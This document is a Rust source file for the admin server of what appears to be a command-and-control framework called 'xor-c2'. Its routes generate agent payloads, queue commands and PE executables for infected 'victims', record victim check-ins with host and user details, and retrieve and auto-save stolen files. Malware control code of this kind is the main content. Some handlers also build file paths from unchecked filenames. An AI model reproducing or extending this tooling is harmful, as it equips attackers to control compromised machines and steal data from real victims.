use actix_web::{
    get, post,
    web::{Data, Json, Path},
    App, HttpRequest, HttpResponse, HttpServer, Responder,
};

use crate::admin::cert_generator;
use crate::admin::command_formatter::CommandFormatter;
use crate::admin::models::*;
use crate::admin::{auth::JwtManager, Database};
use crate::agents::agent_handler::{AgentConfig, AgentHandler};
use crate::config::Config;
use actix_web::http::header::{ContentDisposition, DispositionParam, DispositionType};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Serialize, Deserialize)]
pub struct GenerateAgentRequest {
    pub listener_name: String,
    pub payload_type: String,
    pub config: AgentConfig,
}

#[derive(Clone)]
pub struct AppState {
    pub config: Config,
    pub agent_handler: AgentHandler,
    pub database: Arc<Database>,
    pub jwt_manager: Arc<JwtManager>,
}

#[get("/health")]
async fn health_check() -> impl Responder {
    HttpResponse::Ok().json(HealthResponse {
        status: "ok".to_string(),
        service: "xor-c2".to_string(),
        version: env!("CARGO_PKG_VERSION").to_string(),
    })
}

#[post("/api/login")]
async fn login(
    state: Data<AppState>,
    payload: Json<LoginRequest>,
    req: HttpRequest,
) -> impl Responder {
    log::info!("[*] Login attempt for user: {}", payload.username);

    if let Err(e) = state.database.clean_expired_sessions() {
        log::warn!("[!] Failed to clean expired sessions: {}", e);
    }

    match state
        .database
        .verify_user(&payload.username, &payload.password)
    {
        Ok(true) => match state.jwt_manager.generate_token(&payload.username) {
            Ok(token) => {
                let expires_at = state.jwt_manager.get_expiration_datetime();
                let ip = req.peer_addr().map(|addr| addr.ip().to_string());

                if let Err(e) = state.database.store_session(
                    &token,
                    &payload.username,
                    &expires_at,
                    ip.as_deref(),
                ) {
                    log::error!("[!] Failed to store session: {}", e);
                    return HttpResponse::InternalServerError().json(LoginResponse {
                        success: false,
                        token: None,
                        message: "Failed to create session".to_string(),
                    });
                }

                log::info!("[+] Login successful for user: {}", payload.username);
                HttpResponse::Ok().json(LoginResponse {
                    success: true,
                    token: Some(token),
                    message: "Login successful".to_string(),
                })
            }
            Err(e) => {
                log::error!("[!] Token generation error: {}", e);
                HttpResponse::InternalServerError().json(LoginResponse {
                    success: false,
                    token: None,
                    message: e.to_string(),
                })
            }
        },
        Ok(false) => {
            log::warn!("[!] Login failed for user: {}", payload.username);
            HttpResponse::Unauthorized().json(LoginResponse {
                success: false,
                token: None,
                message: "Invalid credentials".to_string(),
            })
        }
        Err(e) => {
            log::error!("[!] Database error: {}", e);
            HttpResponse::InternalServerError().json(LoginResponse {
                success: false,
                token: None,
                message: "Internal server error".to_string(),
            })
        }
    }
}

#[post("/api/logout")]
async fn logout(state: Data<AppState>, req: HttpRequest) -> impl Responder {
    match state.jwt_manager.extract_token(&req) {
        Ok(token) => {
            if let Err(e) = state.database.delete_session(&token) {
                log::error!("[!] Failed to delete session: {}", e);
            } else {
                log::info!("[+] User logged out successfully");
            }

            HttpResponse::Ok().json(ApiResponse {
                success: true,
                message: "Logout successful".to_string(),
            })
        }
        Err(_) => HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: "Invalid token".to_string(),
        }),
    }
}

#[get("/api/agents")]
async fn list_agents(state: Data<AppState>, req: HttpRequest) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let agents = state.agent_handler.list_agents();
    HttpResponse::Ok().json(agents)
}

// NOUVELLE ROUTE : Génération d'agent avec configuration POST
#[post("/api/generate")]
async fn generate_agent_with_config(
    state: Data<AppState>,
    payload: Json<GenerateAgentRequest>,
    req: HttpRequest,
) -> impl Responder {
    let claims = match state.jwt_manager.authenticate(&req, &state.database) {
        Ok(c) => c,
        Err(e) => {
            return HttpResponse::Unauthorized().json(ApiResponse {
                success: false,
                message: e.to_string(),
            });
        }
    };

    log::info!(
        "[+] Generating agent for listener '{}' with type '{}' by user '{}'",
        payload.listener_name,
        payload.payload_type,
        claims.sub
    );

    match state.agent_handler.create_agent_with_config(
        &payload.listener_name,
        &payload.payload_type,
        &payload.config,
        &state.database,
    ) {
        Ok(agent_data) => {
            let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");

            log::info!(
                "[+] Agent generated for listener '{}' by user '{}' (will register on check-in)",
                payload.listener_name,
                claims.sub
            );

            HttpResponse::Ok()
                .content_type("application/octet-stream")
                .append_header((
                    "Content-Disposition",
                    format!(
                        "attachment; filename=\"agent_{}_{}.bin\"",
                        payload.payload_type, timestamp
                    ),
                ))
                .body(agent_data)
        }
        Err(e) => {
            log::error!("[!] Failed to generate agent: {}", e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to generate agent: {}", e),
            })
        }
    }
}
#[post("/api/task")]
async fn send_task(
    state: Data<AppState>,
    payload: Json<TaskCommand>,
    req: HttpRequest,
) -> impl Responder {
    let claims = match state.jwt_manager.authenticate(&req, &state.database) {
        Ok(c) => c,
        Err(e) => {
            return HttpResponse::Unauthorized().json(ApiResponse {
                success: false,
                message: e.to_string(),
            });
        }
    };

    // ========== FORMATTER LA COMMANDE ==========
    let formatted_command = match CommandFormatter::format_command(&payload.command) {
        Ok(cmd) => cmd,
        Err(e) => {
            log::error!("[!] Failed to format command: {}", e);
            return HttpResponse::BadRequest().json(ApiResponse {
                success: false,
                message: format!("Invalid command format: {}", e),
            });
        }
    };

    log::info!(
        "[+] Command formatted: '{}' -> '{}'",
        payload.command,
        formatted_command
    );

    // ========== AJOUTER LA COMMANDE DANS LA DB ==========
    let command_id = match state
        .database
        .add_command(&payload.agent_id, &formatted_command)
    {
        Ok(id) => {
            log::info!(
                "[+] Command {} queued for agent {} by user {}",
                id,
                payload.agent_id,
                claims.sub
            );
            id
        }
        Err(e) => {
            log::error!("[!] Failed to add command to database: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to queue task: {}", e),
            });
        }
    };

    // ========== TRAITEMENT SPÉCIAL POUR PE-EXEC ==========
    if payload.command.trim().starts_with("/pe-exec ") {
        log::info!("[+] PE-exec command detected, storing PE data...");

        match CommandFormatter::prepare_pe_exec_data(&payload.command) {
            Ok(pe_data_b64) => {
                log::info!(
                    "[+] PE-exec data prepared | size={} bytes | command_id={}",
                    pe_data_b64.len(),
                    command_id
                );

                // Stocker les données PE dans la table dédiée
                match state.database.store_pe_exec_data(command_id, &pe_data_b64) {
                    Ok(()) => {
                        log::info!(
                            "[+] ✅ PE-exec data stored for command {} | size={} bytes",
                            command_id,
                            pe_data_b64.len()
                        );
                    }
                    Err(e) => {
                        log::error!(
                            "[!] ❌ Failed to store PE-exec data for command {}: {}",
                            command_id,
                            e
                        );
                    }
                }
            }
            Err(e) => {
                log::error!(
                    "[!] Failed to prepare PE-exec data for command {}: {}",
                    command_id,
                    e
                );

                return HttpResponse::BadRequest().json(ApiResponse {
                    success: false,
                    message: format!("Failed to prepare PE data: {}", e),
                });
            }
        }
    }

    // ========== LOGGER L'ACTION ==========
    if let Err(e) = state.database.log_agent_action(
        &payload.agent_id,
        "task_sent",
        Some(&payload.command),
        Some(&claims.sub),
    ) {
        log::warn!("[!] Failed to log agent action: {}", e);
    }

    HttpResponse::Ok().json(ApiResponse {
        success: true,
        message: format!(
            "Task queued for agent {} (ID: {})",
            payload.agent_id, command_id
        ),
    })
}
// ========== NOUVELLE ROUTE: Récupération des données PE-exec ==========
#[get("/api/results/{agent_id}")]
async fn get_results(
    state: Data<AppState>,
    agent_id: Path<String>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let agent_id = agent_id.into_inner();

    // Récupérer les résultats depuis la base de données
    match state.database.get_agent_results(&agent_id) {
        Ok(results) => {
            log::info!(
                "[+] Retrieved {} result(s) for agent {}",
                results.len(),
                agent_id
            );

            let formatted_results: Vec<serde_json::Value> = results
                .iter()
                .map(|(id, cmd_id, output, success, types, received_at)| {
                    serde_json::json!({
                        "id": id,
                        "command_id": cmd_id,
                        "output": output,
                        "success": success,
                        "types": types,
                        "received_at": received_at
                    })
                })
                .collect();

            HttpResponse::Ok().json(formatted_results)
        }
        Err(e) => {
            log::error!("[!] Failed to get results for agent {}: {}", agent_id, e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to retrieve results: {}", e),
            })
        }
    }
}

#[post("/api/add/listener")]
async fn add_listener(
    state: Data<AppState>,
    body: Json<GenerateListenerRequest>,
    req: HttpRequest,
) -> impl Responder {
    // Auth
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }
    let headers_json = serde_json::to_string(&body.headers).unwrap();

    if body.listener_type == "https" {
        // ===== HTTPS Listener =====
        let (tls_cert, tls_key, tls_cert_chain, cert_auto_generated) = if body.tls_cert.is_empty()
            || body.tls_key.is_empty()
        {
            // Auto-generate self-signed certificate
            log::info!(
                "[*] No certificate provided, generating self-signed certificate for '{}'",
                body.listener_name
            );

            match cert_generator::generate_cert_for_listener(&body.listener_name, &body.listener_ip)
            {
                Ok(generated) => {
                    log::info!(
                        "[+] Self-signed certificate generated for listener '{}'",
                        body.listener_name
                    );
                    // For self-signed, cert_chain is the same as cert
                    (
                        generated.cert_pem.clone(),
                        generated.key_pem,
                        generated.cert_pem,
                        true,
                    )
                }
                Err(e) => {
                    log::error!("[!] Failed to generate certificate: {}", e);
                    return HttpResponse::InternalServerError().json(ApiResponse {
                        success: false,
                        message: format!("Failed to generate self-signed certificate: {}", e),
                    });
                }
            }
        } else {
            // Use provided certificates
            let cert_chain = if body.tls_cert_chain.is_empty() {
                body.tls_cert.clone()
            } else {
                body.tls_cert_chain.clone()
            };
            (
                body.tls_cert.clone(),
                body.tls_key.clone(),
                cert_chain,
                false,
            )
        };

        if let Err(e) = state.database.add_listener_https(
            &body.listener_name,
            &body.listener_type,
            &body.listener_ip,
            body.listener_port,
            &body.xor_key,
            &body.user_agent,
            &body.uri_paths,
            &headers_json,
            &tls_cert,
            &tls_key,
            &tls_cert_chain,
        ) {
            log::warn!("Failed to add HTTPS listener: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to add HTTPS listener: {}", e),
            });
        }

        let cert_info = if cert_auto_generated {
            " (self-signed certificate auto-generated)"
        } else {
            ""
        };

        log::info!(
            "[+] HTTPS listener '{}' added on {}:{}{}",
            body.listener_name,
            body.listener_ip,
            body.listener_port,
            cert_info
        );

        return HttpResponse::Ok().json(serde_json::json!({
            "success": true,
            "message": format!(
                "HTTPS Listener '{}' added successfully{}. Restart server to activate.",
                body.listener_name,
                cert_info
            ),
            "cert_auto_generated": cert_auto_generated
        }));
    }

    // ===== HTTP Listener =====
    if let Err(e) = state.database.add_listener(
        &body.listener_name,
        &body.listener_type,
        &body.listener_ip,
        body.listener_port,
        &body.xor_key,
        &body.user_agent,
        &body.uri_paths,
        &headers_json,
    ) {
        log::warn!("Failed to add HTTP listener: {}", e);
        return HttpResponse::InternalServerError().json(ApiResponse {
            success: false,
            message: format!("Failed to add HTTP listener: {}", e),
        });
    }

    log::info!(
        "[+] HTTP listener '{}' added on {}:{}",
        body.listener_name,
        body.listener_ip,
        body.listener_port
    );

    HttpResponse::Ok().json(ApiResponse {
        success: true,
        message: format!(
            "HTTP Listener '{}' added successfully. Restart server to activate.",
            body.listener_name
        ),
    })
}

#[post("/api/agent/checkin")]
async fn agent_checkin(state: Data<AppState>, payload: Json<VictimCheckinInfo>) -> impl Responder {
    log::info!(
        "[+] Agent check-in: {} from {}@{} ({})",
        payload.agent_id,
        payload.username,
        payload.hostname,
        payload.ip_address
    );

    if let Err(e) = state.database.update_victim_info(
        &payload.agent_id,
        &payload.hostname,
        &payload.username,
        &payload.os,
        &payload.ip_address,
        &payload.process_name,
    ) {
        log::error!("[!] Failed to update victim info: {}", e);
    }

    if let Some(mut agent_info) = state.agent_handler.get_agent(&payload.agent_id) {
        agent_info.hostname = Some(payload.hostname.clone());
        agent_info.username = Some(payload.username.clone());
        agent_info.ip = Some(payload.ip_address.clone());
        agent_info.process_name = Some(payload.process_name.clone());
        agent_info.last_seen = AgentHandler::get_current_timestamp();

        // ========== CORRECTION: Passer le paramètre database ==========
        state
            .agent_handler
            .update_agent(&payload.agent_id, agent_info, Some(&state.database));
    }

    if let Err(e) = state.database.log_agent_action(
        &payload.agent_id,
        "check_in",
        Some(&format!("from {}@{}", payload.username, payload.hostname)),
        None,
    ) {
        log::warn!("[!] Failed to log agent check-in: {}", e);
    }

    let commands = match state.database.get_pending_commands(&payload.agent_id) {
        Ok(cmds) => {
            log::info!(
                "[+] Found {} pending command(s) for agent {}",
                cmds.len(),
                payload.agent_id
            );

            // Marquer les commandes comme envoyées
            for (cmd_id, _) in &cmds {
                if let Err(e) = state.database.mark_command_sent(*cmd_id) {
                    log::warn!("[!] Failed to mark command {} as sent: {}", cmd_id, e);
                }
            }

            // Extraire seulement les commandes (pas les IDs)
            cmds.into_iter().map(|(_, cmd)| cmd).collect()
        }
        Err(e) => {
            log::error!("[!] Failed to get pending commands: {}", e);
            Vec::new()
        }
    };

    HttpResponse::Ok().json(AgentCheckinResponse {
        success: true,
        message: "Check-in successful".to_string(),
        commands,
    })
}

#[get("/api/victim/details/{agent_id}")]
async fn get_victim_details(
    state: Data<AppState>,
    agent_id: Path<String>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let agent_id = agent_id.into_inner();

    match state.database.get_victim_details(&agent_id) {
        Ok(Some(info)) => {
            log::info!("[+] Retrieved victim details for agent: {}", agent_id);
            HttpResponse::Ok().json(info)
        }
        Ok(None) => {
            log::warn!("[!] Victim info not found for agent: {}", agent_id);
            HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Victim info not found for agent {}", agent_id),
            })
        }
        Err(e) => {
            log::error!("[!] Database error: {}", e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: "Database error".to_string(),
            })
        }
    }
}

#[get("/api/download_file/{filename}")]
async fn download_physical_file(
    filename: Path<String>,
    state: Data<AppState>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let filename = filename.into_inner();
    let path = format!("agents_results/exe/{}", filename);

    match std::fs::read(&path) {
        Ok(bytes) => HttpResponse::Ok()
            .content_type("application/octet-stream")
            .insert_header(ContentDisposition {
                disposition: DispositionType::Attachment,
                parameters: vec![DispositionParam::Filename(filename.clone())],
            })
            .body(bytes),
        Err(_) => HttpResponse::NotFound().json(ApiResponse {
            success: false,
            message: format!("File '{}' not found", filename),
        }),
    }
}

#[get("/api/victims")]
async fn list_victims(state: Data<AppState>, req: HttpRequest) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    match state.database.get_all_victims() {
        Ok(victims) => {
            log::info!("[+] Retrieved {} victim(s) information", victims.len());
            HttpResponse::Ok().json(victims)
        }
        Err(e) => {
            log::error!("[!] Failed to retrieve victims: {}", e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: "Failed to retrieve victims".to_string(),
            })
        }
    }
}

#[get("/api/download/{result_id}")]
async fn download_result_file(
    state: Data<AppState>,
    result_id: Path<i64>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let result_id_value = result_id.into_inner();

    let result = match state.database.get_result_by_id(result_id_value) {
        Ok(Some(r)) => r,
        Ok(None) => {
            return HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Result {} not found", result_id_value),
            });
        }
        Err(e) => {
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Database error: {}", e),
            });
        }
    };

    // ✅ FIX: BLOQUER LES CONFIRMATIONS D'UPLOAD
    let result_type = result.r#types.as_deref().unwrap_or("text");

    if result_type == "upload_file" {
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!("Result {} is an upload confirmation", result_id_value),
        });
    }

    // ✅ Maintenant, vérifier que c'est un fichier téléchargeable
    if result_type != "file" {
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!(
                "Result {} is not a downloadable file (type: {})",
                result_id_value, result_type
            ),
        });
    }

    let filename = if let Some(db_filename) = &result.filename {
        if !db_filename.is_empty() {
            db_filename.clone()
        } else if let Some(cmd_id) = result.command_id {
            state
                .database
                .extract_filename_from_command_id(cmd_id)
                .unwrap_or_else(|| format!("download_{}.bin", result_id_value))
        } else {
            format!("download_{}.bin", result_id_value)
        }
    } else if let Some(cmd_id) = result.command_id {
        state
            .database
            .extract_filename_from_command_id(cmd_id)
            .unwrap_or_else(|| format!("download_{}.bin", result_id_value))
    } else {
        format!("download_{}.bin", result_id_value)
    };

    // ===== Décoder le contenu base64 =====
    let file_data = match STANDARD.decode(&result.output) {
        Ok(data) => data,
        Err(e) => {
            log::error!(
                "Failed to decode file content for result {}: {}",
                result_id_value,
                e
            );
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to decode file content: {}", e),
            });
        }
    };

    // ===== Enregistrement automatique dans downloads/ =====
    let save_dir = "downloads";
    let save_path = format!("{}/{}", save_dir, filename);

    if let Err(e) = std::fs::create_dir_all(save_dir) {
        log::error!("Failed to create downloads directory: {}", e);
    } else {
        match std::fs::write(&save_path, &file_data) {
            Ok(_) => {
                log::info!("✅ File automatically saved to: {}", save_path);
                return HttpResponse::Ok()
                    .content_type("application/octet-stream")
                    .insert_header(("X-File-Saved-At", save_path.clone()))
                    .insert_header(ContentDisposition {
                        disposition: DispositionType::Inline,
                        parameters: vec![DispositionParam::Filename(filename.clone())],
                    })
                    .body(file_data);
            }
            Err(e) => {
                log::warn!("Failed to auto-save file (download still works): {}", e);
            }
        }
    }

    // ===== Réponse normale si l'enregistrement échoue =====
    HttpResponse::Ok()
        .content_type("application/octet-stream")
        .insert_header(ContentDisposition {
            disposition: DispositionType::Attachment,
            parameters: vec![DispositionParam::Filename(filename)],
        })
        .body(file_data)
}
#[post("/api/upload")]
async fn upload_files(
    state: Data<AppState>,
    body: Json<UploadFile>,
    req: HttpRequest,
) -> impl Responder {
    let claims = match state.jwt_manager.authenticate(&req, &state.database) {
        Ok(c) => c,
        Err(e) => {
            return HttpResponse::Unauthorized().json(ApiResponse {
                success: false,
                message: e.to_string(),
            });
        }
    };

    log::info!(
        "[+] Upload request from user '{}' | agent={} | filename={} | size={}",
        claims.sub,
        body.agent_id,
        body.filename,
        body.content.len()
    );

    // ===== VÉRIFIER L'AGENT =====
    match state.agent_handler.get_agent(&body.agent_id) {
        Some(_) => log::debug!("[+] Agent {} found", body.agent_id),
        None => {
            log::warn!("[!] Agent {} not found", body.agent_id);
            return HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Agent {} not found", body.agent_id),
            });
        }
    }

    // ===== VALIDER LE BASE64 =====
    if let Err(e) = STANDARD.decode(&body.content) {
        log::error!("[!] Invalid base64 content: {}", e);
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!("Invalid base64 content: {}", e),
        });
    }

    // ===== FORMATER LA COMMANDE AVEC CommandFormatter =====
    // Créer un fichier temporaire pour que CommandFormatter puisse le lire
    let temp_dir = "temp_uploads";
    std::fs::create_dir_all(temp_dir).ok();
    let temp_path = format!("{}/{}", temp_dir, body.filename);

    // Décoder et écrire le fichier temporaire
    let file_bytes = STANDARD
        .decode(&body.content)
        .map_err(|e| {
            log::error!("[!] Base64 decode error: {}", e);
            HttpResponse::BadRequest().json(ApiResponse {
                success: false,
                message: format!("Invalid base64: {}", e),
            })
        })
        .unwrap();

    if let Err(e) = std::fs::write(&temp_path, &file_bytes) {
        log::error!("[!] Failed to write temp file: {}", e);
        return HttpResponse::InternalServerError().json(ApiResponse {
            success: false,
            message: "Failed to process upload".to_string(),
        });
    }

    // ✅ UTILISER CommandFormatter pour générer la commande
    let upload_command = match CommandFormatter::format_command(&format!("/upload {}", temp_path)) {
        Ok(cmd) => {
            log::info!("[+] Upload command formatted: {}", cmd);
            cmd
        }
        Err(e) => {
            std::fs::remove_file(&temp_path).ok();
            log::error!("[!] Failed to format upload command: {}", e);
            return HttpResponse::BadRequest().json(ApiResponse {
                success: false,
                message: format!("Failed to format command: {}", e),
            });
        }
    };

    // Nettoyer le fichier temporaire
    std::fs::remove_file(&temp_path).ok();

    // ===== CRÉER LA COMMANDE =====
    let command_id = match state.database.add_command(&body.agent_id, &upload_command) {
        Ok(id) => {
            log::info!(
                "[+] Upload command {} created for agent {}",
                id,
                body.agent_id
            );
            id
        }
        Err(e) => {
            log::error!("[!] Failed to create upload command: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to create upload command: {}", e),
            });
        }
    };

    // ===== PAS BESOIN DE STOCKER LE RÉSULTAT ICI =====
    // Le résultat sera stocké quand l'agent confirmera l'upload

    // ===== LOGGER L'ACTION =====
    if let Err(e) = state.database.log_agent_action(
        &body.agent_id,
        "upload_queued",
        Some(&format!(
            "file: {} ({} bytes)",
            body.filename,
            file_bytes.len()
        )),
        Some(&claims.sub),
    ) {
        log::warn!("[!] Failed to log upload action: {}", e);
    }

    log::info!(
        "[+] ✅ Upload queued successfully | agent={} | command_id={} | file={}",
        body.agent_id,
        command_id,
        body.filename
    );

    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "message": format!("Upload queued for agent {}", body.agent_id),
        "command_id": command_id,
        "filename": body.filename,
        "size": file_bytes.len(),
    }))
}

#[get("/api/view/{result_id}")]
async fn view_result_file(
    state: Data<AppState>,
    result_id: Path<i64>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let result_id_value = result_id.into_inner();

    let result = match state.database.get_result_by_id(result_id_value) {
        Ok(Some(r)) => r,
        Ok(None) => {
            return HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Result {} not found", result_id_value),
            });
        }
        Err(e) => {
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Database error: {}", e),
            });
        }
    };

    if result.r#types.as_deref() != Some("file") {
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!("Result {} is not a file", result_id_value),
        });
    }

    // Décoder le Base64
    let file_data = match STANDARD.decode(&result.output) {
        Ok(data) => data,
        Err(e) => {
            log::error!("[!] Failed to decode file content: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to decode file: {}", e),
            });
        }
    };

    // Convertir en texte (si possible)
    let content = match String::from_utf8(file_data.clone()) {
        Ok(text) => text,
        Err(_) => {
            // Si ce n'est pas du texte UTF-8, renvoyer un message
            return HttpResponse::Ok().json(serde_json::json!({
                "result_id": result_id_value,
                "filename": result.filename,
                "size": file_data.len(),
                "type": "binary",
                "message": "Binary file - use /api/download to get the file"
            }));
        }
    };

    // Renvoyer le contenu décodé
    HttpResponse::Ok().json(serde_json::json!({
        "result_id": result_id_value,
        "filename": result.filename,
        "size": file_data.len(),
        "type": "text",
        "content": content
    }))
}

pub async fn start_server(config: Config, agent_handler: AgentHandler) {
    dotenvy::dotenv().ok();

    let db_path = "xor_c2.db";
    let database = Arc::new(Database::new(db_path));

    if let Err(e) = database.init() {
        log::error!("[!] Failed to initialize database: {}", e);
        return;
    }
    log::info!("[+] Database initialized at {}", db_path);
    match agent_handler.load_agents_from_db(&database) {
        Ok(count) => {
            if count > 0 {
                log::info!("[+] ✅ Restored {} existing agent(s) from database", count);
            } else {
                log::info!("[*] No existing agents to restore");
            }
        }
        Err(e) => {
            log::error!("[!] ⚠️  Failed to load agents from database: {}", e);
            log::warn!("[!] Continuing without restored agents...");
        }
    }
    let jwt_manager = Arc::new(JwtManager::from_env());

    let state = AppState {
        config: config.clone(),
        agent_handler,
        database,
        jwt_manager,
    };

    let port = config.get_server_port();
    let bind_addr = format!("0.0.0.0:{}", port);
    log::info!("[+] Starting Actix admin server on {}", bind_addr);

    let server = HttpServer::new(move || {
        App::new()
            .app_data(Data::new(state.clone()))
            .service(health_check)
            .service(login)
            .service(logout)
            .service(list_agents)
            .service(generate_agent_with_config)
            .service(send_task)
            .service(agent_checkin)
            .service(get_victim_details)
            .service(list_victims)
            .service(add_listener)
            .service(get_results)
            .service(download_result_file)
            .service(view_result_file)
            .service(upload_files)
    })
    .bind(&bind_addr);

    let server = match server {
        Ok(srv) => srv,
        Err(e) => {
            log::error!("[!] Failed to bind Actix admin server: {}", e);
            return;
        }
    };

    if let Err(e) = server.run().await {
        log::error!("[!] Actix admin server error: {}", e);
    }
}
